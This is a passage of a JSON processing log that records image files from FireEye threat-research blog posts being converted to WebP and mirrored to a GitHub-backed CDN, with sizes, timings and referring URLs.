22:11:08","host":"europe67*","referer":"http://www.fireeye.com/blog/threat-research/2013/08/execute.html","linkMd5ListStr":"17366ee2647d10e3df3ad24134af351c","githubUser":"myreaderx3","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"2.3 KB","destSize":"7.9 KB","compressRate":"345.5%"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/dcrat/Figure22.png","sourceStatusCode":200,"destWidth":468,"destHeight":257,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn55@2020_3/2020/08/24/14-11-09-184_6042c5c3beda1702.webp","sourceBytes":34424,"destBytes":6098,"targetWebpQuality":75,"feedId":1226,"totalSpendMs":1578,"convertSpendMs":12,"createdTime":"2020-08-24 22:11:08","host":"europe-59*","referer":"http://www.fireeye.com/blog/threat-research/2020/05/analyzing-dark-crystal-rat-backdoor.html","linkMd5ListStr":"0764cfb6d2f7cf1dd7eb3861e780d612","githubUser":"myreaderx30","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"33.6 KB","destSize":"6 KB","compressRate":"17.7%"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/kerberostickets/Picture3.png","sourceStatusCode":200,"destWidth":1037,"destHeight":856,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn87@2020_1/2020/08/24/14-11-09-076_2919aad7e47686ca.webp","sourceBytes":513913,"destBytes":90622,"targetWebpQuality":75,"feedId":1226,"totalSpendMs":1683,"convertSpendMs":62,"createdTime":"2020-08-24 22:11:08","host":"us-028*","referer":"http://www.fireeye.com/blog/threat-research/2020/04/kerberos-tickets-on-linux-red-teams.html","linkMd5ListStr":"763d34f4bd9d31262283be3aa5eebb53","githubUser":"myreaderx1","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"501.9 KB","destSize":"88.5 KB","compressRate":"17.6%"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/legacy/blog/2014/09/flare4.png","sourceStatusCode":200,"destWidth":825,"destHeight":294,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn64@2020_3/2020/08/24/14-11-09-023_f3f95362a4c1edbd.webp","sourceBytes":106180,"destBytes":44104,"targetWebpQuality":75,"feedId":1226,"totalSpendMs":1741,"convertSpendMs":27,"createdTime":"2020-08-24 22:11:08","host":"us-036*","referer":"http://www.fireeye.com/blog/threat-research/2014/09/flare-ida-pro-script-series-msdn-annotations-ida-pro-for-malware-analysis.html","linkMd5ListStr":"cc6c3768f4a41b06b832d14c48c730b0","githubUser":"myreaderx24","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"103.7 KB","destSize":"43.1 KB","compressRate":"41.5%"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/bochs/Picture9.png","sourceStatusCode":200,"destWidth":662,"destHeight":300,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn12@2020_6/2020/08/24/14-11-09-096_6a0414c217bd22b1.webp","sourceBytes":66888,"destBytes":22940,"targetWebpQuality":75,"feedId":1226,"totalSpendMs":1776,"convertSpendMs":12,"createdTime":"2020-08-24 22:11:08","host":"europe-25*","referer":"http://www.fireeye.com/blog/threat-research/2020/04/code-grafting-to-unpack-malware-in-emulation.html","linkMd5ListStr":"6e300db7afe3b0d6d31a9de593949d0c","githubUser":"myreaderx16","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"65.3 KB","destSize":"22.4 KB","compressRate":"34.3%"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/legacy/ammo/Figure-12-300x112.png","sourceStatusCode":200,"destWidth":300,"destHeight":112,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn99@2020_2/2020/08/24/14-11-09-346_a1d0dbd0c555d0ec.webp","sourceBytes":23945,"destBytes":4962,"targetWebpQuality":75,"feedId":1226,"totalSpendMs":1872,"convertSpendMs":4,"createdTime":"2020-08-24 22:11:08","host":"europe67*","referer":"http://www.fireeye.com/blog/threat-research/2012/04/investigating-indicators-compromise-environment-latest.html","linkMd5ListStr":"cd580e956aa5020b43328f8c0198b293","githubUser":"myreaderx8","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"23.4 KB","destSize":"4.8 KB","compressRate":"20.7%"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/dynamicanalysis/Picture6.png","sourceStatusCode":200,"destWidth":900,"destHeight":788,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn66@2020_6/2020/08/24/14-11-09-260_c863b143641f517f.webp","sourceBytes":387883,"destBytes":48762,"targetWebpQuality":75,"feedId":1226,"totalSpendMs":1896,"convertSpendMs":36,"createdTime":"2020-08-24 22:11:08","host":"europe68*","referer":"http://www.fireeye.com/blog/threat-research/2020/07/configuring-windows-domain-dynamically-analyze-obfuscated-lateral-movement-tool.html","linkMd5ListStr":"e1bf3a686b04aa63d07c105c1bc6bebc","githubUser":"myreaderx25","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"378.8 KB","destSize":"47.6 KB","compressRate":"12.6%"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/legacy/blog/2014/09/flare3.png","sourceStatusCode":200,"destWidth":825,"destHeight":201,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn56@2020_1/2020/08/24/14-11-09-218_136b458d43e8c870.webp","sourceBytes":107307,"destBytes":37752,"targetWebpQuality":75,"feedId":1226,"totalSpendMs":1897,"convertSpendMs":17,"createdTime":"2020-08-24 22:11:08","host":"europe21*","referer":"http://www.fireeye.com/blog/threat-research/2014/09/flare-ida-pro-script-series-msdn-annotations-ida-pro-for-malware-analysis.html","linkMd5ListStr":"cc6c3768f4a41b06b832d14c48c730b0","githubUser":"myreaderx2","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"104.8 KB","destSize":"36.9 KB","compressRate":"35.2%"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/Rotten%20Apples%20Fahim%20Abbasi/Tab4.png","sourceStatusCode":200,"destWidth":760,"destHeight":370,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn15@2020_2/2020/08/24/14-11-09-105_f2f5bf087a11b2c2.webp","sourceBytes":45973,"destBytes":33614,"targetWebpQuality":75,"feedId":1226,"totalSpendMs":2052,"convertSpendMs":15,"createdTime":"2020-08-24 22:11:08","host":"europe63*","referer":"http://www.fireeye.com/blog/threat-research/2016/10/rotten_apples_resur.html","linkMd5ListStr":"71dead00e4b9f7e22cc8c5c7aec1d029","githubUser":"myreaderx21","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"44.9 KB","destSize":"32.8 KB","compressRate":"73.1%"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/masslogger/figure13.png","sourceStatusCode":200,"destWidth":1004,"destHeight":154,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx14/cdn75@2020_5/2020/08/24/14-11-09-178_c3ece76475c7aa43.webp","sourceBytes":144269,"destBytes":37834,"targetWebpQuality":75,"feedId":1226,"totalSpendMs":1992,"convertSpendMs":13,"createdTime":"2020-08-24 22:11:08","host":"europe-25*","referer":"http://www.fireeye.com/blog/threat-research/2020/08/bypassing-masslogger-anti-analysis-man-in-the-middle-approach.html","linkMd5ListStr":"9a7bbc41e123c400b9944084b8bf8adf","githubUser":"myreaderx14","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"140.9 KB","destSize":"36.9 KB","compressRate":"26.2%"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/legacy/ammo/Figure-1-300x139.png","sourceStatusCode":200,"destWidth":300,"destHeight":139,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn81@2020_1/2020/08/24/14-11-09-333_1875b9969d785aae.webp","sourceBytes":38993,"destBytes":4884,"targetWebpQuality":75,"feedId":1226,"totalSpendMs":2034,"convertSpendMs":5,"createdTime":"2020-08-24 22:11:08","host":"europe66*","referer":"http://www.fireeye.com/blog/threat-research/2012/04/investigating-indicators-compromise-environment-latest.html","linkMd5ListStr":"cd580e956aa5020b43328f8c0198b293","githubUser":"myreaderx27","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"38.1 KB","destSize":"4.8 KB","compressRate":"12.5%"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/kerberostickets/Picture2.png","sourceStatusCode":200,"destWidth":747,"destHeight":172,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx14/cdn57@2020_1/2020/08/24/14-11-09-580_c9e8e2444df15614.webp","sourceBytes":65205,"destBytes":14004,"targetWebpQuality":75,"feedId":1226,"totalSpendMs":2074,"convertSpendMs":84,"createdTime":"2020-08-24 22:11:08","host":"us-013*","referer":"http://www.fireeye.com/blog/threat-research/2020/04/kerberos-tickets-on-linux-red-teams.html","linkMd5ListStr":"763d34f4bd9d31262283be3aa5eebb53","githubUser":"myreaderx14","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"63.7 KB","destSize":"13.7 KB","compressRate":"21.5%"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/legacy/ammo/Figure-34.png","sourceStatusCode":200,"destWidth":357,"destHeight":281,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn31@2020_3/2020/08/24/14-11-09-174_d22543ff46b58d7e.webp","sourceBytes":1855,"destBytes":10452,"targetWebpQuality":75,"feedId":1226,"totalSpendMs":2104,"convertSpendMs":5,"createdTime":"2020-08-24 22:11:08","host":"europe66*","referer":"http://www.fireeye.com/blog/threat-research/2013/12/openioc-series-investigating-indicators-compromise-iocs.html","linkMd5ListStr":"7630b59e5b18e448f20d4671a1b210ea","githubUser":"myreaderx18","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"1.8 KB","destSize":"10.2 KB","compressRate":"563.5%"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/icsransomware/Picture2.png","sourceStatusCode":200,"destWidth":1374,"destHeight":1054,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn61@2020_2/2020/08/24/14-11-09-468_b8347c99ebe5cc4e.webp","sourceBytes":1022058,"destBytes":181842,"targetWebpQuality":75,"feedId":1226,"totalSpendMs":2245,"convertSpendMs":527,"createdTime":"2020-08-24 22:11:08","host":"us-001*","referer":"http://www.fireeye.com/blog/threat-research/2020/02/ransomware-against-machine-learning-to-disrupt-industrial-production.html","linkMd5ListStr":"51000961f0e42b6616b05ac7b80851cb","githubUser":"myreaderx5oss","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"998.1 KB","destSize":"177.6 KB","compressRate":"17.8%"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/legacy/ammo/Image-31.png","sourceStatusCode":200,"destWidth":379,"destHeight":121,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx/cdn95@2020_2/2020/08/24/14-11-09-209_1cd7083a9f3519b3.webp","sourceBytes":1130,"destBytes":5020,"targetWebpQuality":75,"feedId":1226,"totalSpendMs":2160,"convertSpendMs":7,"createdTime":"2020-08-24 22:11:08","host":"europe-59*","referer":"http://www.fireeye.com/blog/threat-research/2013/10/openioc-basics.html","linkMd5ListStr":"20ce2231b2c2aaabe2a32818aa16b711","githubUser":"myreaderx","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"1.1 KB","destSize":"4.9 KB","compressRate":"444.2%"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/dcrat/Figure12.png","sourceStatusCode":200,"destWidth":885,"destHeight":787,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn50@2020_5/2020/08/24/14-11-09-248_c329898aa7316e18.webp","sourceBytes":83389,"destBytes":107182,"targetWebpQuality":75,"feedId":1226,"totalSpendMs":2239,"convertSpendMs":63,"createdTime":"2020-08-24 22:11:08","host":"europe70*","referer":"http://www.fireeye.com/blog/threat-research/2020/05/analyzing-dark-crystal-rat-backdoor.html","linkMd5ListStr":"0764cfb6d2f7cf1dd7eb3861e780d612","githubUser":"myreaderx24","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"81.4 KB","destSize":"104.7 KB","compressRate":"128.5%"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/excelerating2/Picture6.png","sourceStatusCode":200,"destWidth":230,"destHeight":340,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn57@2020_1/2020/08/24/14-11-09-354_d7dc2cc3381c5787.webp","sourceBytes":38301,"destBytes":10494,"targetWebpQuality":75,"feedId":1226,"totalSpendMs":2227,"convertSpendMs":10,"createdTime":"2020-08-24 22:11:08","host":"europe-58*","referer":"http://www.fireeye.com/blog/threat-research/2020/04/excelerating-analysis-lookup-pivot.html","linkMd5ListStr":"32b532188c0a4e8fcaeae1dce52d4ecf","githubUser":"myreaderx4","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"37.4 KB","destSize":"10.2 KB","compressRate":"27.4%"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/excelerating2/Picture9.png","sourceStatusCode":200,"destWidth":788,"destHeight":182,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn16@2020_1/2020/08/24/14-11-10-086_601ada9ead7878b8.webp","sourceBytes":43908,"destBytes":17460,"targetWebpQuality":75,"feedId":1226,"totalSpendMs":1178,"convertSpendMs":12,"createdTime":"2020-08-24 22:11:09","host":"us-008*","referer":"http://www.fireeye.com/blog/threat-research/2020/04/excelerating-analysis-lookup-pivot.html","linkMd5ListStr":"32b532188c0a4e8fcaeae1dce52d4ecf","githubUser":"myreaderx19","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"42.9 KB","destSize":"17.1 KB","compressRate":"39.8%"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/excelerating2/Picture15.png","sourceStatusCode":200,"destWidth":936,"destHeight":394,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn11@2020_2/2020/08/24/14-11-10-095_09777e9679495f2a.webp","sourceBytes":101770,"destBytes":28666,"targetWebpQuality":75,"feedId":1226,"totalSpendMs":1266,"convertSpendMs":41,"createdTime":"2020-08-24 22:11:09","host":"us-020*","referer":"http://www.fireeye.com/blog/threat-research/2020/04/excelerating-analysis-lookup-pivot.html","linkMd5ListStr":"32b532188c0a4e8fcaeae1dce52d4ecf","githubUser":"myreaderx31","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"99.4 KB","destSize":"28 KB","compressRate":"28.2%"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/legacy/ammo/Figure-6-300x147.png","sourceStatusCode":200,"destWidth":300,"destHeight":147,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn52@2020_1/2020/08/24/14-11-10-213_74098ed02512f8cd.webp","sourceBytes":31187,"destBytes":6624,"targetWebpQuality":75,"feedId":1226,"totalSpendMs":1108,"convertSpendMs":14,"createdTime":"2020-08-24 22:11:09","host":"us-028*","referer":"http://www.fireeye.com/blog/threat-research/2012/04/investigating-indicators-compromise-environment-latest.html","linkMd5ListStr":"cd580e956aa5020b43328f8c0198b293","githubUser":"myreaderx11","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"30.5 KB","destSize":"6.5 KB","compressRate":"21.2%"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/legacy/ammo/ir_report.jpg","sourceStatusCode":200,"destWidth":511,"destHeight":516,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn7@2020_3/2020/08/24/14-11-09-956_26dfb7515cf38c9d.webp","sourceBytes":45215,"destBytes":27678,"targetWebpQuality":75,"feedId":1226,"totalSpendMs":1421,"convertSpendMs":59,"createdTime":"2020-08-24 22:11:09","host":"us-032*","referer":"http://www.fireeye.com/blog/threat-research/2011/02/zynamics-memory-analysis.html","linkMd5ListStr":"1f2caa91e01abc44789c089c8b346516","githubUser":"myreaderx6","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"44.2 KB","destSize":"27 KB","compressRate":"61.2%"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/bochs/Picture13.png","sourceStatusCode":200,"destWidth":1047,"destHeight":593,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn52@2020_2/2020/08/24/14-11-09-753_a2c85d5172c01cf6.webp","sourceBytes":244856,"destBytes":67696,"targetWebpQuality":75,"feedId":1226,"totalSpendMs":2496,"convertSpendMs":33,"createdTime":"2020-08-24 22:11:08","host":"europe69*","referer":"http://www.fireeye.com/blog/threat-research/2020/04/code-grafting-to-unpack-malware-in-emulation.html","linkMd5ListStr":"6e300db7afe3b0d6d31a9de593949d0c","githubUser":"myreaderx10","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"239.1 KB","destSize":"66.1 KB","compressRate":"27.6%"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/legacy/ammo/Figure-1-Option-Dialog-300x220.png","sourceStatusCode":200,"destWidth":300,"destHeight":220,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn55@2020_6/2020/08/24/14-11-10-261_f36526d63dac7af3.webp","sourceBytes":13735,"destBytes":3806,"targetWebpQuality":75,"feedId":1226,"totalSpendMs":1153,"convertSpendMs":12,"createdTime":"2020-08-24 22:11:09","host":"us-016*","referer":"http://www.fireeye.com/blog/threat-research/2012/12/freeware-release-ioc-editor-ioce-v220.html","linkMd5ListStr":"9977cf893642d8853e900044f2f0b64c","githubUser":"myreaderx32","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"13.4 KB","destSize":"3.7 KB","compressRate":"27.7%"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/excelerating2/Picture7.png","sourceStatusCode":200,"destWidth":902,"destHeight":144,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn31@2020_2/2020/08/24/14-11-10-175_d366f41f5a7985cb.webp","sourceBytes":55266,"destBytes":26034,"targetWebpQuality":75,"feedId":1226,"totalSpendMs":1236,"convertSpendMs":15,"createdTime":"2020-08-24 22:11:09","host":"us-024*","referer":"http://www.fireeye.com/blog/threat-research/2020/04/excelerating-analysis-lookup-pivot.html","linkMd5ListStr":"32b532188c0a4e8fcaeae1dce52d4ecf","githubUser":"myreaderx33","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"54 KB","destSize":"25.4 KB","compressRate":"47.1%"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/dcrat/Figure13.png","sourceStatusCode":200,"destWidth":994,"destHeight":489,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn27@2020_1/2020/08/24/14-11-10-146_ccf0e3e5e7670853.webp","sourceBytes":52858,"destBytes":69510,"targetWebpQuality":75,"feedId":1226,"totalSpendMs":1266,"convertSpendMs":25,"createdTime":"2020-08-24 22:11:09","host":"us-036*","referer":"http://www.fireeye.com/blog/threat-research/2020/05/analyzing-dark-crystal-rat-backdoor.html","linkMd5ListStr":"0764cfb6d2f7cf1dd7eb3861e780d612","githubUser":"myreaderx21","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"51.6 KB","destSize":"67.9 KB","compressRate":"131.5%"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/dcrat/Figure21.png","sourceStatusCode":200,"destWidth":643,"destHeight":363,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn36@2020_1/2020/08/24/14-11-10-173_39ce194bb19009f4.webp","sourceBytes":52113,"destBytes":73176,"targetWebpQuality":75,"feedId":1226,"totalSpendMs":1303,"convertSpendMs":19,"createdTime":"2020-08-24 22:11:09","host":"us-012*","referer":"http://www.fireeye.com/blog/threat-research/2020/05/analyzing-dark-crystal-rat-backdoor.html","linkMd5ListStr":"0764cfb6d2f7cf1dd7eb3861e780d612","githubUser":"myreaderx15","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"50.9 KB","destSize":"71.5 KB","compressRate":"140.4%"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/dcrat/Figure20.png","sourceStatusCode":200,"destWidth":657,"destHeight":1007,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn80@2020_5/2020/08/24/14-11-10-357_67c0b3f80d9a81a4.webp","sourceBytes":121350,"destBytes":27392,"targetWebpQuality":75,"feedId":1226,"totalSpendMs":1202,"convertSpendMs":35,"createdTime":"2020-08-24 22:11:09","host":"us-008*","referer":"http://www.fireeye.com/blog/threat-research/2020/05/analyzing-dark-crystal-rat-backdoor.html","linkMd5ListStr":"0764cfb6d2f7cf1dd7eb3861e780d612","githubUser":"myreaderx10","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"118.5 KB","destSize":"26.8 KB","compressRate":"22.6%"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/legacy/ammo/Figure-14-300x137.png","sourceStatusCode":200,"destWidth":300,"destHeight":137,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn71@2020_3/2020/08/24/14-11-10-381_b0ad922be776c632.webp","sourceBytes":37043,"destBytes":7558,"targetWebpQuality":75,"feedId":1226,"totalSpendMs":1284,"convertSpendMs":13,"createdTime":"2020-08-24 22:11:09","host":"us-032*","referer":"http://www.fireeye.com/blog/threat-research/2012/04/investigating-indicators-compromise-environment-latest.html","linkMd5ListStr":"cd580e956aa5020b43328f8c0198b293","githubUser":"myreaderx4","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"36.2 KB","destSize":"7.4 KB","compressRate":"20.4%"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/legacy/blog/2014/09/flare11.png","sourceStatusCode":200,"destWidth":975,"destHeight":276,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx22/cdn60@2020_6/2020/08/24/14-11-10-445_e36bf542d366d4d9.webp","sourceBytes":144552,"destBytes":37564,"targetWebpQuality":75,"feedId":1226,"totalSpendMs":1416,"convertSpendMs":20,"createdTime":"2020-08-24 22:11:09","host":"us-004*","referer":"http://www.fireeye.com/blog/threat-research/2014/09/flare-ida-pro-script-series-msdn-annotations-ida-pro-for-malware-analysis.html","linkMd5ListStr":"cc6c3768f4a41b06b832d14c48c730b0","githubUser":"myreaderx22","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"141.2 KB","destSize":"36.7 KB","compressRate":"26%"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/excelerating2/Picture14.png","sourceStatusCode":200,"destWidth":732,"destHeight":398,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn67@2020_2/2020/08/24/14-11-10-294_7d23ed7a9bcc285e.webp","sourceBytes":115431,"destBytes":75694,"targetWebpQuality":75,"feedId":1226,"totalSpendMs":1347,"convertSpendMs":20,"createdTime":"2020-08-24 22:11:09","host":"us-55*","referer":"http://www.fireeye.com/blog/threat-research/2020/04/excelerating-analysis-lookup-pivot.html","linkMd5ListStr":"32b532188c0a4e8fcaeae1dce52d4ecf","githubUser":"myreaderx30","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"112.7 KB","destSize":"73.9 KB","compressRate":"65.6%"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/legacy/blog/2013/10/Darkleech_Java_Classes.png","sourceStatusCode":200,"destWidth":296,"destHeight":335,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn99@2020_1/2020/08/24/14-11-10-499_acc7be31ffb42664.webp","sourceBytes":14275,"destBytes":8092,"targetWebpQuality":75,"feedId":1226,"totalSpendMs":1163,"convertSpendMs":6,"createdTime":"2020-08-24 22:11:10","host":"us-012*","referer":"http://www.fireeye.com/blog/threat-research/2013/10/another-darkleech-campaign.html","linkMd5ListStr":"1c03952058e21f3ba555a5a240ad0390","githubUser":"myreaderx1","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"13.9 KB","destSize":"7.9 KB","compressRate":"56.7%"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/Rotten%20Apples%20Fahim%20Abbasi/Tab1.png","sourceStatusCode":200,"destWidth":1234,"destHeight":730,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn47@2020_5/2020/08/24/14-11-10-355_8aff45ea3840390a.webp","sourceBytes":100398,"destBytes":119548,"targetWebpQuality":75,"feedId":1226,"totalSpendMs":1586,"convertSpendMs":156,"createdTime":"2020-08-24 22:11:09","host":"us-040*","referer":"http://www.fireeye.com/blog/threat-research/2016/10/rotten_apples_resur.html","linkMd5ListStr":"71dead00e4b9f7e22cc8c5c7aec1d029","githubUser":"myreaderx29","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"98 KB","destSize":"116.7 KB","compressRate":"119.1%"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/capa/Picture2.png","sourceStatusCode":200,"destWidth":846,"destHeight":642,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn96@2020_1/2020/08/24/14-11-10-612_8624d7eb92ed5fc5.webp","sourceBytes":160606,"destBytes":55952,"targetWebpQuality":75,"feedId":1226,"totalSpendMs":1315,"convertSpendMs":57,"createdTime":"2020-08-24 22:11:10","host":"us-024*","referer":"http://www.fireeye.com/blog/threat-research/2020/07/capa-automatically-identify-malware-capabilities.html","linkMd5ListStr":"1713ce3c3a0b9282bdf9ca71663282c4","githubUser":"myreaderx25","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"156.8 KB","destSize":"54.6 KB","compressRate":"34.8%"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/legacy/ammo/Figure-3-Vista+-EventID-4688-Process-creation.png","sourceStatusCode":200,"destWidth":503,"destHeight":219,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn19@2020_3/2020/08/24/14-11-10-484_fd6ad7290350b715.webp","sourceBytes":4547,"destBytes":15588,"targetWebpQuality":75,"feedId":1226,"totalSpendMs":1703,"convertSpendMs":9,"createdTime":"2020-08-24 22:11:09","host":"europe21*","referer":"http://www.fireeye.com/blog/threat-research/2013/08/execute.html","linkMd5ListStr":"17366ee2647d10e3df3ad24134af351c","githubUser":"myreaderx7","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"4.4 KB","destSize":"15.2 KB","compressRate":"342.8%"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/excelerating2/Picture4.png","sourceStatusCode":200,"destWidth":888,"destHeight":184,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx/cdn15@2020_2/2020/08/24/14-11-10-839_88d8be22b7b2298e.webp","sourceBytes":70113,"destBytes":26568,"targetWebpQuality":75,"feedId":1226,"totalSpendMs":1228,"convertSpendMs":12,"createdTime":"2020-08-24 22:11:10","host":"us-028*","referer":"http://www.fireeye.com/blog/threat-research/2020/04/excelerating-analysis-lookup-pivot.html","linkMd5ListStr":"32b532188c0a4e8fcaeae1dce52d4ecf","githubUser":"myreaderx","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"68.5 KB","destSize":"25.9 